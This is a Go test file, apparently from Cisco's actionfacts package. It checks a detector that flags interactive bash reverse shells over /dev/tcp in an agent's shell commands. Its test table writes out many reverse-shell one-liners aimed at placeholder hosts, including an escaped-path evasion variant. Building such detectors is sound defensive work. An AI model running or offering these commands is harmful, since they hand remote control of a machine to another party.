// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import "testing"

func TestExactPOSIXInteractiveDevTCPShell(t *testing.T) {
	for _, test := range []struct {
		name, source string
		want         bool
	}{
		{"feedback IPv4", `bash -i >& /dev/tcp/192.0.2.8/4444 0>&1`, true},
		{"feedback hostname", `bash -i >& /dev/tcp/relay.invalid/4444 0>&1`, true},
		{"escaped literal path", `bash -i >& /de\v/t\cp/relay.invalid/4444 0>&1`, true},
		{"outbound interactive", `bash -i >& /dev/tcp/192.0.2.8/4444`, true},
		{"ordinary log", `bash -i >& /tmp/session.log 0>&1`, false},
		{"case-varied ordinary path", `bash -i >& /DEV/TCP/collector.invalid/443 0>&1`, false},
		{"null output", `bash -i >& /dev/null 0>&1`, false},
		{"loopback", `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`, false},
		{"legacy loopback", `bash -i >& /dev/tcp/127.1/4444 0>&1`, false},
		{"localhost", `bash -i >& /dev/tcp/localhost/4444 0>&1`, false},
		{"invalid port", `bash -i >& /dev/tcp/192.0.2.8/99999 0>&1`, false},
		{"reversed descriptor copy", `bash -i 0>&1 >& /dev/tcp/192.0.2.8/4444`, false},
		{"extra redirect", `bash -i >& /dev/tcp/192.0.2.8/4444 0>&1 2>/tmp/log`, false},
		{"command mode", `bash -ic true >& /dev/tcp/192.0.2.8/4444 0>&1`, false},
		{"positional script", `bash -i local.sh >& /dev/tcp/192.0.2.8/4444 0>&1`, false},
		{"background", `bash -i >& /dev/tcp/192.0.2.8/4444 0>&1 &`, false},
		{"conditional", `true && bash -i >& /dev/tcp/192.0.2.8/4444 0>&1`, false},
		{"another command", `true; bash -i >& /dev/tcp/192.0.2.8/4444 0>&1`, false},
		{"quoted mention", `printf '%s\n' 'bash -i >& /dev/tcp/192.0.2.8/4444 0>&1'`, false},
		{"dynamic destination", `bash -i >& /dev/tcp/$HOST/4444 0>&1`, false},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := Analyze(Input{Tool: "shell", Command: test.source})
			if got := ExactPOSIXInteractiveDevTCPShell(test.source, facts); got != test.want {
				t.Fatalf("proof=%t, want %t; facts=%+v", got, test.want, facts)
			}
		})
	}
}

func TestExactPOSIXInteractiveDevTCPShellBenignRedirectAllocations(t *testing.T) {
	source := `bash -i >& /tmp/session.log 0>&1`
	facts := Analyze(Input{Tool: "shell", Command: source})
	if got := testing.AllocsPerRun(100, func() {
		if ExactPOSIXInteractiveDevTCPShell(source, facts) {
			t.Fatal("ordinary redirect proved as a network shell")
		}
	}); got != 0 {
		t.Fatalf("ordinary redirect proof allocated %.0f times per call, want zero", got)
	}
}
